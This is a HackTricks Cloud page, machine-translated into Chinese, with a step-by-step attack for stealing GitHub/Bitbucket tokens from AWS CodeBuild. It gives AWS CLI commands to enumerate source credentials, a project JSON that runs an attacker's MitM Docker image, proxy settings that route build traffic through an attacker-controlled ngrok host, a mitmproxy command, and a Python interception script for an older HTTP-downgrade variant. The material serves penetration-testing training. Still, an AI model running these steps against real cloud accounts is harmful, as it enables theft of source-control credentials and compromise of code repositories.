# AWS Codebuild - Token Leakage

{% hint style="success" %}
学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持 HackTricks</summary>

* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **在** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**上关注我们。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 分享黑客技巧。

</details>
{% endhint %}

## 恢复 Github/Bitbucket 配置的令牌

首先，检查是否配置了任何源凭据，以便您可以泄露：
```bash
aws codebuild list-source-credentials
```
### 通过 Docker 镜像

如果你发现例如 Github 的认证已在账户中设置，你可以通过让 Codebuild **使用特定的 docker 镜像** 来运行项目的构建，从而 **提取** 该 **访问** （**GH token 或 OAuth token**）。

为此，你可以 **创建一个新的 Codebuild 项目** 或更改现有项目的 **环境** 以设置 **Docker 镜像**。

你可以使用的 Docker 镜像是 [https://github.com/carlospolop/docker-mitm](https://github.com/carlospolop/docker-mitm)。这是一个非常基础的 Docker 镜像，将设置 **环境变量 `https_proxy`**、**`http_proxy`** 和 **`SSL_CERT_FILE`**。这将允许你拦截在 **`https_proxy`** 和 **`http_proxy`** 中指示的主机的大部分流量，并信任在 **`SSL_CERT_FILE`** 中指示的 SSL 证书。

1. **创建并上传你自己的 Docker MitM 镜像**
* 按照仓库的说明设置你的代理 IP 地址并设置你的 SSL 证书，然后 **构建 docker 镜像**。
* **不要设置 `http_proxy`** 以避免拦截对元数据端点的请求。
* 你可以使用 **`ngrok`**，例如 `ngrok tcp 4444` 来将代理设置为你的主机。
* 一旦你构建了 Docker 镜像，**将其上传到公共仓库**（Dockerhub, ECR...）。
2. **设置环境**
* 创建一个 **新的 Codebuild 项目** 或 **修改** 现有项目的环境。
* 设置项目使用 **之前生成的 Docker 镜像**。

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

3. **在你的主机上设置 MitM 代理**

* 如 **Github 仓库** 中所示，你可以使用类似的命令：
```bash
mitmproxy --listen-port 4444  --allow-hosts "github.com"
```
{% hint style="success" %}
使用的 **mitmproxy 版本是 9.0.1**，据报道在版本 10 中这可能无法工作。
{% endhint %}

4. **运行构建并捕获凭证**

*   您可以在 **Authorization** 头中看到令牌：

<figure><img src="../../../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

这也可以通过 aws cli 以类似的方式完成

{% code overflow="wrap" %}
```bash
# Create project using a Github connection
aws codebuild create-project --cli-input-json file:///tmp/buildspec.json

## With /tmp/buildspec.json
{
"name": "my-demo-project",
"source": {
"type": "GITHUB",
"location": "https://github.com/uname/repo",
"buildspec": "buildspec.yml"
},
"artifacts": {
"type": "NO_ARTIFACTS"
},
"environment": {
"type": "LINUX_CONTAINER", // Use "ARM_CONTAINER" to run docker-mitm ARM
"image": "docker.io/carlospolop/docker-mitm:v12",
"computeType": "BUILD_GENERAL1_SMALL",
"imagePullCredentialsType": "CODEBUILD"
}
}

## Json

# Start the build
aws codebuild start-build --project-name my-project2
```
{% endcode %}

### ~~通过HTTP协议~~

{% hint style="success" %}
**此漏洞在2023年2月20日那一周的某个时候被AWS修复（我认为是在星期五）。因此攻击者无法再利用它 :)**
{% endhint %}

具有**在CodeBuild中提升权限的攻击者可能会泄露配置的Github/Bitbucket令牌**，或者如果权限是通过OAuth配置的，则**用于访问代码的临时OAuth令牌**。

* 攻击者可以将环境变量**http\_proxy**和**https\_proxy**添加到指向其机器的CodeBuild项目中（例如`http://5.tcp.eu.ngrok.io:14972`）。

<figure><img src="../../../../.gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (10) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* 然后，将github仓库的URL更改为使用HTTP而不是HTTPS，例如：\*\*http://\*\*github.com/carlospolop-forks/TestActions
* 然后，在代理变量（http\_proxy和https\_proxy）指向的端口上运行[https://github.com/synchronizing/mitm](https://github.com/synchronizing/mitm)中的基本示例。
```python
from mitm import MITM, protocol, middleware, crypto

mitm = MITM(
host="127.0.0.1",
port=4444,
protocols=[protocol.HTTP],
middlewares=[middleware.Log], # middleware.HTTPLog used for the example below.
certificate_authority = crypto.CertificateAuthority()
)
mitm.run()
```
* 最后，点击 **Build the project**，**凭证**将以 **明文**（base64）发送到 mitm 端口：

<figure><img src="../../../../.gitbook/assets/image (1) (1) (6).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
现在攻击者将能够从他的机器上使用令牌，列出它拥有的所有权限，并比直接使用 CodeBuild 服务更容易地（滥用）它。
{% endhint %}

{% hint style="success" %}
学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持 HackTricks</summary>

* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享黑客技巧。

</details>
{% endhint %}
